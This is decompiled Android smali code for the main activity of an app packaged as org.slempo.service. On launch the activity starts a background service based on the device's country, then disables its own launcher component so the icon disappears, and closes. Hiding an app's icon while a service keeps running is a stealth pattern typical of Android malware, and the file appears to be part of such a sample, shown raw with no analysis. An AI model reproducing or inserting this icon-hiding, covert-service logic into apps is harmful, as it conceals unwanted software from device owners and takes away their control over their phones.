.class public Lorg/slempo/service/Main;
.super Landroid/app/Activity;
.source "Main.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 7
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 17
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 18
    invoke-static {p0}, Lorg/slempo/service/utils/Utils;->getCountry(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    .line 19
    .local v2, "country":Ljava/lang/String;
    sget-boolean v5, Lorg/slempo/service/MainService;->isRunning:Z

    if-nez v5, :cond_0

    const-string v5, ""

    invoke-virtual {v2, v5}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_0

    .line 20
    new-instance v3, Landroid/content/Intent;

    const-string v5, "com.slempo.baseapp.MainServiceStart"

    invoke-direct {v3, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 21
    .local v3, "i":Landroid/content/Intent;
    const-class v5, Lorg/slempo/service/MainService;

    invoke-virtual {v3, p0, v5}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 22
    invoke-virtual {p0, v3}, Lorg/slempo/service/Main;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 24
    .end local v3    # "i":Landroid/content/Intent;
    :cond_0
    const-string v5, "3"

    const-string v6, "3"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    const-string v5, "3"

    const-string v6, "1"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 25
    :cond_1
    invoke-virtual {p0}, Lorg/slempo/service/Main;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    .line 26
    .local v4, "packageManager":Landroid/content/pm/PackageManager;
    new-instance v1, Landroid/content/ComponentName;

    const-class v5, Lorg/slempo/service/Main;

    invoke-direct {v1, p0, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 27
    .local v1, "componentName":Landroid/content/ComponentName;
    const/4 v5, 0x2

    const/4 v6, 0x1

    invoke-virtual {v4, v1, v5, v6}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 30
    invoke-virtual {p0}, Lorg/slempo/service/Main;->finish()V

    .line 42
    .end local v1    # "componentName":Landroid/content/ComponentName;
    .end local v4    # "packageManager":Landroid/content/pm/PackageManager;
    :cond_2
    :goto_0
    return-void

    .line 31
    :cond_3
    const-string v5, "3"

    const-string v6, "2"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    .line 32
    const v5, 0x7f030020

    invoke-virtual {p0, v5}, Lorg/slempo/service/Main;->setContentView(I)V

    .line 33
    const v5, 0x7f0a0068

    invoke-virtual {p0, v5}, Lorg/slempo/service/Main;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    .line 34
    .local v0, "button":Landroid/widget/Button;
    new-instance v5, Lorg/slempo/service/Main$1;

    invoke-direct {v5, p0}, Lorg/slempo/service/Main$1;-><init>(Lorg/slempo/service/Main;)V

    invoke-virtual {v0, v5}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto :goto_0
.end method
